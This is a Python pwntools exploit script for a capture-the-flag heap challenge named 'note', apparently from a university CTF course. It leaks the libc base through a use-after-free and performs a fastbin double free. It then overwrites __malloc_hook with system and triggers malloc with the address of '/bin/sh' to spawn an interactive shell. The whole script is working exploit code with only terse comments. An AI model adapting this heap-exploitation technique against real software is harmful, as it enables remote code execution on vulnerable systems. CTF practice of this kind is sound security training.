# python 2.7 for better compatibility
from pwn import *

context.clear(arch='x86_64')

# chunk malloc hook and insert one gadget into it
# r = remote('edu-ctf.csie.org', 10178)
r = process('./note')

def add(size, note):
    r.sendafter('>', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', note)

def show(idx):
    r.sendafter('>', '2')
    r.sendafter('Index: ', str(idx))

def delete(idx):
    r.sendafter('>', '3')
    r.sendafter('Index: ', str(idx))

add(0x100, 'leak') # note 0
add(0x68, 'a') # note 1
add(0x68, 'b') # note 2

delete(0)
show(0)
r.recvline()

libc_base = u64(r.recv(6) + '\0\0') - 0x3c4b78
print('libc_base --> ', hex(libc_base))

pause()
delete(1)
delete(2)
delete(1)

libc = ELF('./libc-2.23.so')

pause()
add(0x68, p64(libc_base + libc.sym.__malloc_hook - 0x10 - 3))
add(0x68, 'a')
add(0x68, 'a')

add(0x68, 'aaa' + p64(libc_base + libc.sym.system))

r.sendafter('>', '1')
r.sendafter('Size: ', str(libc_base + libc.search('/bin/sh').next()))

r.interactive()
